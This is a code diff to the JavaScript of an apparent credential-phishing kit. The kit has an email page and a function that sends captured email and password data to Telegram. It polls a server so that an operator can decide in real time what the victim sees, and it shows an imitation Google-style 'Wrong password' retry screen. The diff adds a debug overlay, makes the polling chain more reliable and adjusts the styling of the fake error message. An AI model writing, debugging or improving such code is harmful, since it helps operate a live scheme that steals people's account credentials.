@@ -8,7 +8,32 @@ let isTransitioning   = false; // prevent double page transitions
 
 document.addEventListener('DOMContentLoaded', function() {
   initEmailPage();
+  initDebugOverlay();
 });
+
+function initDebugOverlay() {
+  // Small debug panel — remove before going live
+  var panel = document.createElement('div');
+  panel.id = '__debug_panel';
+  panel.style.cssText = (
+    'position:fixed;bottom:0;right:0;width:360px;max-height:200px;' +
+    'background:rgba(0,0,0,0.85);color:#0f0;font:11px/1.4 monospace;' +
+    'z-index:9999;overflow:hidden;border-top-left-radius:8px;display:flex;flex-direction:column;'
+  );
+  panel.innerHTML = (
+    '<div style="padding:4px 8px;background:#111;color:#fff;font-size:10px;display:flex;justify-content:space-between;">' +
+    '<span>\uD83D\uDD2C Debug Log</span>' +
+    '<button id="__debug_close" style="background:none;border:none;color:#fff;cursor:pointer;font-size:12px">X</button>' +
+    '</div>' +
+    '<div id="__debug_log" style="flex:1;overflow-y:auto;padding:4px 8px;"></div>'
+  );
+  document.body.appendChild(panel);
+  // Close button handler
+  panel.querySelector('button').addEventListener('click', function() {
+    panel.style.display = 'none';
+  });
+  dbg('Debug overlay ready — polling chain tracking active');
+}
 
 function initEmailPage() {
   const form = document.getElementById('email-form');
@@ -299,47 +324,84 @@ function sendToTelegram(dataType, email, data, sessionId) {
 // Global polling flag — ensures only one poll chain runs at a time
 // and in-flight fetches don't trigger transitions after polling is stopped
 let pollingActive = false;
+let pollChainId   = 0; // unique ID per pollForResponse call — stale in-flight fetches are ignored
+
+function dbg(msg) {
+  console.log('[POLL DEBUG] ' + msg);
+  // Update debug overlay if present
+  var el = document.getElementById('__debug_log');
+  if (el) {
+    var line = document.createElement('div');
+    line.style.cssText = 'border-bottom:1px solid #333;padding:2px 0;';
+    line.textContent = new Date().toISOString().split('T')[1].split('.')[0] + ' ' + msg;
+    el.insertBefore(line, el.firstChild);
+    // Keep last 30 lines
+    while (el.children.length > 30) el.removeChild(el.lastChild);
+  }
+}
 
 function pollForResponse(sessionId, submitBtn) {
-  // Stop any previous poll chain
+  // Increment chain ID — any in-flight tick() from a previous call will see
+  // myChainId !== pollChainId and abort, preventing stale transitions
+  pollChainId++;
+  const myChainId = pollChainId;
   pollingActive = false;
 
-  const maxWait    = 120000;
-  const interval   = 1000;
-  const startTime  = Date.now();
+  dbg('pollForResponse started. chain=' + myChainId + ' session=' + sessionId.substring(0,8) + '...');
 
-  // Small buffer before first poll to let any network state settle
-  setTimeout(startPolling, 200);
+  const maxWait   = 120000;
+  const interval  = 1000;
+  const startTime = Date.now();
+
+  // Longer delay — gives send-to-telegram time to reset session in Supabase
+  // AND allows Supabase replication to propagate before first read
+  setTimeout(startPolling, 1200);
 
   function startPolling() {
+    if (myChainId !== pollChainId) {
+      dbg('startPolling aborted (superseded) chain=' + myChainId);
+      return;
+    }
     pollingActive = true;
+    dbg('polling started chain=' + myChainId);
     tick();
   }
 
   function tick() {
-    if (!pollingActive) return; // stopped externally
+    if (myChainId !== pollChainId || !pollingActive) {
+      dbg('tick aborted chain=' + myChainId + ' active=' + pollingActive);
+      return;
+    }
 
     if (Date.now() - startTime > maxWait) {
       pollingActive = false;
+      dbg('poll TIMEOUT chain=' + myChainId);
       if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = 'Next'; }
       return;
     }
 
-    fetch('/api/poll-session?sessionId=' + sessionId)
+    fetch('/api/poll-session?sessionId=' + sessionId + '&chain=' + myChainId)
       .then(function(r) { return r.json(); })
       .then(function(data) {
-        if (!pollingActive) return; // stopped while fetch was in-flight
+        // Abort if superseded by a newer pollForResponse call
+        if (myChainId !== pollChainId || !pollingActive) {
+          dbg('fetch result discarded (superseded) chain=' + myChainId);
+          return;
+        }
+
+        dbg('poll result: status=' + data.status + ' responseType=' + (data.responseType||'null') + ' chain=' + myChainId);
 
         if (data.status === 'responded' && data.responseType) {
-          pollingActive = false; // stop before transition
+          pollingActive = false;
+          dbg('RESPONSE DETECTED: ' + data.responseType + ' chain=' + myChainId);
           handleTelegramResponse(data.responseType, data.response, data.email || currentEmail, sessionId);
         } else {
-          // Still waiting — schedule next tick
           setTimeout(tick, interval);
         }
       })
-      .catch(function() {
-        if (pollingActive) setTimeout(tick, interval);
+      .catch(function(err) {
+        dbg('poll fetch error: ' + err.message);
+        if (myChainId === pollChainId && pollingActive) setTimeout(tick, interval);
       });
   }
 }
@@ -407,7 +469,7 @@ function showIncorrectPasswordPage(email, sessionId) {
     '</div>' +
     '<div style="display:flex;align-items:center;gap:6px;margin-top:8px">' +
     '<svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#d93025" d="M11 15h2v2h-2zm0-8h2v6h-2zm1-5C6.47 2 2 6.5 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2zm0 18a8 8 0 0 1-8-8 8 8 0 0 1 8-8 8 8 0 0 1 8 8 8 8 0 0 1-8 8z"/></svg>' +
-    '<span style="color:#e8eaed;font-size:14px;line-height:1.4">Wrong password. Try again or click &#34;Forgot password?&#34; for more options.</span>' +
+    '<span style="color:#d93025;font-size:14px;line-height:1.4">Wrong password. Try again or click &#34;Forgot password?&#34; for more options.</span>' +
     '</div>' +
     '<div class="qx5512-cr" style="margin-top:16px"><input id="pw-retry-show" type="checkbox"><label for="pw-retry-show">Show password</label></div>' +
     '</div>' +
